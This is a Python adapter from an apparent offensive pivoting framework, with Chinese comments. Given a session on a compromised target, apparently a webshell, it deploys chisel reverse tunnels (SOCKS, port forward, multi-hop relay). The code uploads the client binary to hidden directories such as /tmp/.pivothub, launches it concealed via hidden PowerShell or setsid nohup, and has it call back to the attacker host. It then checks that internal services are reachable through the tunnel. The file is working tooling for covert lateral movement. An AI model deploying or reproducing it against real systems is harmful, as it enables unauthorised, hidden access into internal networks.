"""chisel 适配器：三种链路类型（socks / portfwd / relay）真实部署。

生命周期：
  generate_config → start(本机 chisel server) → upload(客户端二进制分块)
  → execute(靶机后台执行) → wait_callback(本机端口可连) → verify(隧道内读目标 banner)
  → 交由 /api/links/deploy 登记 ProxyLink（含逐层 pid）

三种链路（与 assets/js/views/proxy.js 的命令模板一致）：
  socks   : chisel client <lhost>:<listen> R:<bind>:<lport>:socks
  portfwd : chisel client <lhost>:<listen> R:<bind>:<lport>:<thost>:<tport>
  relay   : ① 攻击机 chisel server -p <listen> --reverse
            ② 上层跳板 chisel client <lhost>:<listen> <listen>:<listen>
            ③ 本层节点 chisel client <relayAddr>:<relayPort> R:<bind>:<lport>:socks

约束：lhost（攻击机地址）由调用方给出（/api/attack 配置），禁止写死 127.0.0.1；
      本机监听一律 127.0.0.1（合规：面板仅本地）。
"""

from __future__ import annotations

import secrets
import socket
import subprocess
import sys
import time
from pathlib import Path

from ..config import TOOLS_DIR
from ..session.base import SessionBase
from .base import AdapterBase, DeployResult, PidRecord, TunnelCheck

REMOTE_DIR_LINUX = "/tmp/.pivothub"
REMOTE_DIR_WIN = r"%TEMP%\.pivothub"


def pick_lhost(target_ip: str) -> str:
    """选取本机到目标可路由的源 IP（UDP connect 不发包即可得出口地址）。

    仅作为默认建议：调用方（/api/attack 用户配置）显式给出地址时以其为准。
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect((target_ip, 9))  # discard 端口，不产生载荷
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except OSError:
        pass
    return "127.0.0.1"


def port_open(port: int, host: str = "127.0.0.1", timeout: float = 1.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def read_banner(port: int, host: str = "127.0.0.1", timeout: float = 3.0,
                probe: bytes = b"\r\n") -> tuple[bool, str]:
    """连本机 <port> 读回显（隧道内真实到达目标服务）。"""
    start = time.perf_counter()
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if probe:
                try:
                    s.sendall(probe)
                except OSError:
                    pass
            try:
                data = s.recv(256)
            except socket.timeout:
                data = b""
            ms = int((time.perf_counter() - start) * 1000)
            text = data.decode("utf-8", "replace").strip()
            return (True, text or "(connected, no banner)")
    except OSError as e:
        return False, f"连接失败: {e}"


def socks5_read_banner(socks_port: int, target_host: str, target_port: int,
                       host: str = "127.0.0.1", timeout: float = 5.0,
                       probe: bytes = b"\r\n") -> TunnelCheck:
    """经本机 Socks5 入口连目标服务并读 banner（证明隧道真的通了）。"""
    start = time.perf_counter()
    try:
        with socket.create_connection((host, socks_port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(b"\x05\x01\x00")                     # 无认证
            if s.recv(2) != b"\x05\x00":
                return TunnelCheck(target=f"{target_host}:{target_port}", error="Socks5 握手失败")
            host_b = socket.inet_aton(target_host)
            s.sendall(b"\x05\x01\x00\x01" + host_b + int(target_port).to_bytes(2, "big"))
            rep = s.recv(10)
            if len(rep) < 2 or rep[1] != 0x00:
                return TunnelCheck(target=f"{target_host}:{target_port}",
                                   error=f"Socks5 CONNECT 被拒 (rep={rep[1] if len(rep) > 1 else '?'})")
            if probe:
                try:
                    s.sendall(probe)
                except OSError:
                    pass
            try:
                data = s.recv(256)
            except socket.timeout:
                data = b""
            ms = int((time.perf_counter() - start) * 1000)
            return TunnelCheck(ok=True, target=f"{target_host}:{target_port}",
                               banner=data.decode("utf-8", "replace").strip() or "(connected, no banner)",
                               ms=ms)
    except OSError as e:
        return TunnelCheck(target=f"{target_host}:{target_port}",
                           error=f"连接失败: {e}",
                           ms=int((time.perf_counter() - start) * 1000))


class ChiselAdapter(AdapterBase):
    tool = "chisel"

    def __init__(self, tools_dir: Path | None = None) -> None:
        self.tools_dir = Path(tools_dir or TOOLS_DIR)

    # ---- 命令生成（与前端 proxy.js 模板逐字一致）----

    def generate_config(self, *, lhost: str, server_port: int, local_port: int, auth: str,
                        link_type: str = "socks", bind: str = "0.0.0.0",
                        target_host: str = "", target_port: int = 0,
                        relay_addr: str = "", relay_port: int = 0,
                        remote_bin: str = "./chisel", platform: str = "linux") -> dict:
        listen = int(server_port)
        lport = int(local_port)
        # chisel 客户端参数必须出现在 <server> 之前（Go flag 解析：--auth 放在 server 之后
        # 会被当成 remote 报 "Missing ports"）
        auth_s = f" --auth {auth}" if auth else ""
        server = f"{remote_bin} server -p {listen} --reverse --auth {auth}"
        if link_type == "portfwd":
            target = (f"{remote_bin} client{auth_s} {lhost}:{listen} "
                      f"R:{bind}:{lport}:{target_host}:{target_port}")
        elif link_type == "relay":
            target = (f"{remote_bin} client{auth_s} {relay_addr}:{relay_port} "
                      f"R:{bind}:{lport}:socks")
        else:
            target = (f"{remote_bin} client{auth_s} {lhost}:{listen} "
                      f"R:{bind}:{lport}:socks")
        # 中继跳的本地监听默认 0.0.0.0（真实网络里本层节点需经内网口接入）；
        # 显式指定 bind（如本机联调 127.0.0.1）时收窄到该地址，避免 Windows 防火墙弹窗
        relay_listen = int(relay_port or listen)
        if bind and bind != "0.0.0.0":
            relay_cmd = (f"{remote_bin} client{auth_s} {lhost}:{listen} "
                         f"{bind}:{relay_listen}:{lhost}:{listen}")
        else:
            relay_cmd = f"{remote_bin} client{auth_s} {lhost}:{listen} {relay_listen}:{listen}"
        return {"server": server, "target": target, "relay": relay_cmd,
                "linkType": link_type, "platform": platform}

    # ---- 内部工具 ----

    def _bins(self, platform: str, remote_dir: str = "") -> tuple[Path, Path, str, str]:
        """返回 (服务端二进制, 客户端二进制, 远端目录, 远端客户端路径)。"""
        server_bin = self.tools_dir / ("chisel.exe" if sys.platform == "win32" else "chisel")
        if platform == "windows":
            d = remote_dir or REMOTE_DIR_WIN
            return server_bin, self.tools_dir / "chisel.exe", d, d.rstrip("\\") + r"\chisel.exe"
        d = remote_dir or REMOTE_DIR_LINUX
        return server_bin, self.tools_dir / "chisel_linux", d, d.rstrip("/") + "/chisel"

    def _node_dir(self, remote_dir: str, tag: str) -> str:
        """每台节点独立子目录（同机多节点/重复部署时避免二进制文件被占用）。"""
        safe = "".join(c for c in str(tag) if c.isalnum() or c in "-_") or "node"
        sep = "\\" if ("\\" in remote_dir or (len(remote_dir) > 1 and remote_dir[1] == ":")) else "/"
        return remote_dir.rstrip("\\/") + sep + safe

    def _prepare_remote(self, session: SessionBase, remote_dir: str, remote_path: str,
                        client_bin: Path, log: list[str]) -> str:
        if session.platform == "windows":
            session.exec(f'if not exist "{remote_dir}" mkdir "{remote_dir}"', timeout=15)
        else:
            session.exec(f"mkdir -p {remote_dir}", timeout=15)
        data = client_bin.read_bytes()
        # Windows 下上一轮同名进程可能仍短暂占用文件 → 退避重试（不伪造成功）
        last = ""
        for attempt in range(3):
            try:
                n = session.upload_file(remote_path, data)
                log.append(f"uploaded {n} bytes → {remote_path}"
                           + (f"（第 {attempt + 1} 次尝试）" if attempt else ""))
                break
            except Exception as e:  # 目录被占用/半写
                last = str(e)
                log.append(f"upload retry {attempt + 1}: {last[:120]}")
                time.sleep(1.5)
        else:
            raise RuntimeError(f"客户端二进制上传失败: {last}")
        if session.platform != "windows":
            session.exec(f"chmod +x {remote_path}", timeout=10)
        return remote_path

    def _spawn_background(self, session: SessionBase, cmd: str, log: list[str],
                          pattern: str = "chisel.exe", log_dir: str = "",
                          exclude_pids: list[int] | None = None,
                          marker: str = "") -> tuple[bool, int | None, str]:
        """在目标侧后台拉起客户端并返回真实 pid（Windows 用进程命令行核对，POSIX 用 $!）。

        marker：进程定位用的命令行唯一子串（推荐传本次部署的 --auth 令牌）——
        同机可能存在其他会话/历史遗留的 chisel client，仅按 "client" 定位会认错 pid，
        导致销毁时结束错误进程、留下孤儿。
        """
        if session.platform == "windows":
            parts = cmd.split()
            exe, rest = parts[0], " ".join(parts[1:])
            redir = ""
            if log_dir:
                redir = (" -RedirectStandardError '" + log_dir.rstrip("\\") + "\\c.err'"
                         " -RedirectStandardOutput '" + log_dir.rstrip("\\") + "\\c.out'")
            full = ("powershell -NoP -NonI -W Hidden -Command "
                    "\"Start-Process -FilePath '" + exe + "' -ArgumentList '" + rest
                    + "' -WindowStyle Hidden" + redir + "\"")
            res = session.exec(full, timeout=45)
            log.append("exec(win): " + ((res.output or res.error or "").strip()[:120] or "(no output)"))
            # Windows 侧以真实进程为准则：Start-Process 已把进程交给系统，退出码不可靠
            exclude = set(exclude_pids or [])
            marker = marker or (rest.split()[0] if rest else "client")
            for _ in range(8):
                pids = [p for p in session.find_pids_cmd(marker, image="chisel") if p not in exclude]
                if pids:
                    log.append(f"spawn pid={pids[-1]} marker={marker}")
                    return True, pids[-1], ""
                time.sleep(0.7)
            err = "目标侧未发现客户端进程"
            if log_dir:
                tail = session.exec(f'type "{log_dir.rstrip(chr(92))}\\c.err"', timeout=12)
                if (tail.output or "").strip():
                    err += " · " + tail.output.strip().splitlines()[-1][:160]
            log.append("spawn fail: " + err)
            return False, None, err
        full = f"setsid nohup {cmd} >{REMOTE_DIR_LINUX}/c.log 2>&1 </dev/null & echo PID=$!"
        res = session.exec(full, timeout=30)
        out = (res.output or "").strip()
        log.append("exec: " + out[:120])
        if "PID=" in out:
            try:
                return True, int(out.split("PID=")[1].split()[0]), ""
            except (IndexError, ValueError):
                pass
        if res.ok:
            pids = session.find_pids(pattern)
            if pids:
                return True, pids[-1], ""
        return False, None, res.error or "客户端执行失败"

    def _start_server(self, server_bin: Path, lhost: str, server_port: int,
                      auth: str) -> tuple[subprocess.Popen | None, str]:
        """攻击机侧 chisel 服务端（真实子进程；仅本地监听语义由 --reverse 决定）。"""
        if not server_bin.exists():
            return None, f"缺少服务端二进制: {server_bin}"
        try:
            proc = subprocess.Popen(
                [str(server_bin), "server", "--host", lhost, "--port", str(server_port),
                 "--reverse", "--auth", auth],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                creationflags=(getattr(subprocess, "CREATE_NO_WINDOW", 0)),
            )
        except OSError as e:
            return None, f"服务端启动失败: {e}"
        time.sleep(1.0)
        if proc.poll() is not None:
            return None, "服务端秒退（端口被占用或参数错误）"
        return proc, ""

    def _wait_local_port(self, proc: subprocess.Popen, port: int, wait_s: int,
                         log: list[str], lhost: str = "", listen_host: str = "") -> tuple[bool, str]:
        """等靶机回连：本机 local_port 可连即视为隧道建立。

        失败时给出可操作的真实提示（Windows 防火墙入站提示未批准 = 靶机回连被丢弃，
        表现为「服务端在跑但端口一直不开」；本机自测走回环不受影响）。
        """
        deadline = time.time() + max(1, wait_s)
        while time.time() < deadline:
            if proc.poll() is not None:
                return False, "服务端进程退出"
            if port_open(port):
                log.append(f"callback ok: 127.0.0.1:{port} listening")
                return True, ""
            time.sleep(1.0)
        hint = ""
        if lhost and not lhost.startswith("127.") and listen_host not in ("127.0.0.1",):
            hint = (f"；若靶机与攻击机不在同一台机器，请确认攻击机防火墙已放行 "
                    f"{listen_host}:{port} 的入站连接（Windows 首次监听会弹窗，"
                    f"未批准会生成 Block 规则 → 靶机回连被静默丢弃）")
        return False, f"{wait_s}s 内未检测到回连（本机端口 {port} 未开）{hint}"

    # ---- 主流程 ----

    def deploy(self, session: SessionBase, *, target_ip: str, link_type: str = "socks",
               lhost: str = "", server_port: int | None = None, local_port: int | None = None,
               bind: str = "0.0.0.0", target_host: str = "", target_port: int = 0,
               relay_addr: str = "", relay_port: int = 0, relay_session: SessionBase | None = None,
               wait_s: int = 45, verify: bool = True, verify_target: str = "",
               verify_port: int = 0, remote_dir: str = "", bind_host: str = "") -> DeployResult:
        """部署一条链路。link_type ∈ {socks, portfwd, relay}。

        - socks/portfwd：session = 本层节点会话
        - relay：relay_session = 上层跳板会话（②步），session = 本层双网卡节点会话（③步）
        - remote_dir：目标侧暂存目录（Windows 需绝对路径，%TEMP% 不会被 PHP 展开）
        - bind_host：攻击机侧 chisel 服务端绑定地址（缺省取 lhost = 用户配置的攻击机地址，
          不再写死 0.0.0.0；本机验证场景可显式传 127.0.0.1）
        """
        log: list[str] = []
        if link_type not in ("socks", "portfwd", "relay"):
            return DeployResult(ok=False, stage="linkType", error=f"不支持的链路类型: {link_type}")

        platform = session.platform
        server_bin, client_bin, remote_dir, remote_path = self._bins(platform, remote_dir)
        if not server_bin.exists():
            return DeployResult(ok=False, stage="binary", error=f"缺少服务端二进制: {server_bin}")
        if not client_bin.exists():
            return DeployResult(ok=False, stage="binary", error=f"缺少客户端二进制: {client_bin}")

        if link_type == "relay" and relay_session is None:
            return DeployResult(ok=False, stage="relay", error="多级中继缺少上层跳板会话（第 ② 步）")

        lhost = (lhost or "").strip() or pick_lhost(target_ip)
        server_port = int(server_port or (int(local_port or 0) + 1) or 1331)
        local_port = int(local_port or (server_port - 1))
        auth = "pivothub:" + secrets.token_hex(4)
        pids: list[PidRecord] = []
        hops: list[dict] = []

        # 攻击机侧服务端：优先绑定用户配置的攻击机地址（缺省 lhost）；本机不可绑时回落 0.0.0.0
        listen_host = (bind_host or "").strip() or lhost or "0.0.0.0"
        proc, err = self._start_server(server_bin, listen_host, server_port, auth)
        if proc is None and listen_host not in ("0.0.0.0", "127.0.0.1"):
            log.append(f"bind {listen_host} 失败（{err}）→ 回落 0.0.0.0（本机自测/网卡未就绪）")
            listen_host = "0.0.0.0"
            proc, err = self._start_server(server_bin, listen_host, server_port, auth)
        if proc is None:
            return DeployResult(ok=False, stage="server", error=err, log=log)
        pids.append(PidRecord(pid=proc.pid, role="server", host_id="", port=server_port,
                              cmd=f"chisel server -p {server_port} --reverse"))
        log.append(f"server pid={proc.pid} {listen_host}:{server_port}")

        try:
            # ① 本层节点上传客户端（每台节点独立子目录：同机多节点/重复部署不互相锁文件）
            my_dir = self._node_dir(remote_dir, getattr(session, "host_id", "") or "node")
            my_path = my_dir.rstrip("\\/") + ("\\chisel.exe" if platform == "windows" else "/chisel")
            self._prepare_remote(session, my_dir, my_path, client_bin, log)
            bin_name = my_path  # 绝对路径：Windows 下 %TEMP% 不会被 PHP/Start-Process 展开

            # ② 多级中继：上层跳板把监听端口转发到本层可达的内网口
            if link_type == "relay":
                rp = int(relay_port or server_port)
                r_dir = self._node_dir(remote_dir, getattr(relay_session, "host_id", "") or "relay")
                r_path = r_dir.rstrip("\\/") + (
                    "\\chisel.exe" if relay_session.platform == "windows" else "/chisel")
                self._prepare_remote(relay_session, r_dir, r_path, client_bin, log)
                rbin = r_path
                cfg_relay = self.generate_config(
                    lhost=lhost, server_port=server_port, local_port=local_port, auth=auth,
                    link_type="relay", relay_addr=relay_addr, relay_port=relay_port,
                    bind=bind, remote_bin=rbin, platform=relay_session.platform)
                log.append(f"relay cmd: {cfg_relay['relay']} (relay_port={relay_port})")
                ok, rpid, rerr = self._spawn_background(relay_session, cfg_relay["relay"], log,
                                                        log_dir=r_dir, marker=auth,
                                                        exclude_pids=[p.pid for p in pids if p.pid])
                if not ok:
                    return DeployResult(ok=False, stage="relay_upstream", error=rerr,
                                        pid=proc.pid, pids=[p.to_dict() for p in pids], log=log)
                pids.append(PidRecord(pid=rpid or 0, role="relay",
                                      host_id=getattr(relay_session, "host_id", ""),
                                      port=rp, cmd=cfg_relay["relay"]))
                hops.append({"role": "上层跳板中继（暴露内网口）",
                             "hostId": getattr(relay_session, "host_id", ""),
                             "cmd": cfg_relay["relay"]})
                # 等上层中继把端口暴露到内网口（本机经 relayAddr 可达性由调用方保证）
                deadline = time.time() + 12
                while time.time() < deadline:
                    if port_open(rp, host=relay_addr or "127.0.0.1"):
                        log.append(f"relay port up: {relay_addr or '127.0.0.1'}:{rp}")
                        break
                    time.sleep(1.0)
                else:
                    log.append(f"relay port {relay_addr}:{rp} 未在 12s 内就绪（继续尝试本层接入）")

            cfg = self.generate_config(
                lhost=lhost, server_port=server_port, local_port=local_port, auth=auth,
                link_type=link_type, bind=bind, target_host=target_host,
                target_port=target_port, relay_addr=relay_addr, relay_port=relay_port,
                remote_bin=bin_name, platform=platform)
            # 第 ① 步（攻击机监听）先入 hops，保证顺序与前端一致
            hops.insert(0, {"role": "攻击机监听", "hostId": "h-attacker",
                            "cmd": f"{bin_name} server -p {server_port} --reverse --auth {auth}"})
            hops.append({"role": {"socks": "跳板机回连（Socks）",
                                  "portfwd": "跳板机回连（端口转发）",
                                  "relay": "本层双网卡节点回连"}[link_type],
                         "hostId": getattr(session, "host_id", ""), "cmd": cfg["target"]})

            ok, tpid, terr = self._spawn_background(session, cfg["target"], log,
                                                    log_dir=my_dir, marker=auth,
                                                    exclude_pids=[p.pid for p in pids if p.pid])
            if not ok:
                return DeployResult(ok=False, stage="execute", error=terr, pid=proc.pid,
                                    pids=[p.to_dict() for p in pids], log=log)
            pids.append(PidRecord(pid=tpid or 0, role="target",
                                  host_id=getattr(session, "host_id", ""),
                                  port=local_port, cmd=cfg["target"]))

            # ③ 等回连：本机 local_port 可连即视为隧道建立
            ok, werr = self._wait_local_port(proc, local_port, wait_s, log,
                                             lhost=lhost, listen_host=listen_host)
            if not ok:
                self._rollback(proc, pids, session, relay_session)
                return DeployResult(ok=False, stage="wait_callback", error=werr,
                                    pid=proc.pid, pids=[p.to_dict() for p in pids],
                                    link_type=link_type, hops=hops, log=log)

            result = DeployResult(ok=True, pid=proc.pid, pids=[p.to_dict() for p in pids],
                                  lhost=lhost, server_port=server_port,
                                  socks_port=local_port, local_port=local_port,
                                  remote_path=remote_path, auth=auth, link_type=link_type,
                                  hops=hops, log=log)

            # ④ 隧道内真实性验证：连本机端口读到目标服务回显
            if verify:
                check = self.verify_tunnel(
                    link_type=link_type, local_port=local_port,
                    target_host=verify_target or target_host or target_ip,
                    target_port=verify_port or target_port or 0,
                    session=session)
                result.verify = check
                log.append(f"verify: {check.to_dict()}")
                if not check.ok:
                    self._rollback(proc, pids, session, relay_session)
                    return DeployResult(ok=False, stage="verify",
                                        error=f"隧道已建立但目标服务不可达：{check.error}",
                                        pid=None, pids=[p.to_dict() for p in pids],
                                        link_type=link_type, hops=hops, verify=check, log=log)
            return result
        except Exception as e:  # pragma: no cover - 兜底
            self._rollback(proc, pids, session, relay_session)
            return DeployResult(ok=False, stage="exception", error=str(e),
                                pids=[p.to_dict() for p in pids], log=log)

    def target_reachable(self, session: SessionBase, host: str, port: int,
                         timeout: float = 15.0) -> TunnelCheck:
        """从跳板机（本层节点）真实连接目标服务 —— portfwd 的决定性验证。

        本机入口端口可连只证明「反向监听已建立」；目标服务是否真的可达，必须在
        目标侧实测（chisel 的反向监听对失败的目标拨号同样会接受连接）。
        """
        if session.platform == "windows":
            cmd = ('powershell -NoP -NonI -Command "try{$c=New-Object Net.Sockets.TcpClient;'
                   f"$c.Connect('{host}',{int(port)}); Write-Output 'TCP OPEN'; $c.Close()}}"
                   "catch{Write-Output 'TCP CLOSED'}\"")
        else:
            cmd = (f"(timeout 5 bash -c 'exec 3<>/dev/tcp/{host}/{int(port)} && echo TCP OPEN' 2>&1 "
                   "|| echo TCP CLOSED)")
        res = session.exec(cmd, timeout=timeout)
        out = ((res.output or "") + "\n" + (res.error or "")).upper()
        if "TCP OPEN" in out:
            return TunnelCheck(ok=True, target=f"{host}:{port}", banner="TCP OPEN（跳板机实测）",
                               ms=int(getattr(res, "ms", 0) or 0))
        detail = (res.error or res.output or "").strip().replace("\n", " ")[:80]
        return TunnelCheck(
            ok=False, target=f"{host}:{port}",
            error=f"目标服务不可达：跳板机连接 {host}:{port} 失败" + (f"（{detail}）" if detail else ""),
            ms=int(getattr(res, "ms", 0) or 0))

    def verify_tunnel(self, *, link_type: str, local_port: int,
                      target_host: str = "", target_port: int = 0,
                      session: SessionBase | None = None) -> TunnelCheck:
        """真实验证：portfwd 先在目标侧实测目标服务，再查本机入口；
        socks/relay 经本机 Socks5 入口连目标服务读回显。"""
        if link_type == "portfwd":
            if session is not None and target_host and target_port:
                reach = self.target_reachable(session, target_host, int(target_port))
                if not reach.ok:
                    return reach
            ok, text = read_banner(local_port)
            return TunnelCheck(ok=ok, target=f"127.0.0.1:{local_port}",
                               banner=text if ok else "", error="" if ok else text)
        if not target_host or not target_port:
            return TunnelCheck(ok=False, error="socks/relay 验证缺少目标服务地址")
        return socks5_read_banner(local_port, target_host, int(target_port))

    def _rollback(self, proc: subprocess.Popen | None, pids: list[PidRecord],
                  session: SessionBase | None = None,
                  relay_session: SessionBase | None = None) -> None:
        """失败回滚：结束本机服务端与已拉起的远端进程（不留孤儿）。"""
        from ..util import proc_kill

        if proc is not None:
            try:
                proc.kill()
            except Exception:
                pass
        for rec in pids:
            if not rec.pid or rec.role == "server":
                continue
            sess = relay_session if rec.role == "relay" else session
            if sess is None:
                continue
            try:
                sess.kill_pid(int(rec.pid))
            except Exception:
                pass
